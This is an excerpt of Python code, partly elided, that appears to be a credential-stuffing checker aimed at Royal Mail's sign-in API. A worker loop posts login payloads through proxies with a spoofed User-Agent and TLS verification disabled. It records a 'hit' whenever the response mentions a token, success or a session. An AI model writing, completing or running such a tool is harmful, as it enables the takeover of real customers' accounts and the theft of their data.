...
def worker(q):
    ...
    while True:
        ...
        for attempt in range(2):
            try:
                login_url = "https://www.royalmail.com/api/signin"
                headers = {
                    "User-Agent": userA,
                ...
                r = s.post(login_url, json=payload, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
                
                if r.status_code == 200 and ("token" in r.text.lower() or "success" in r.text.lower() or "session" in r.text.lower()):
                    result = "hit"
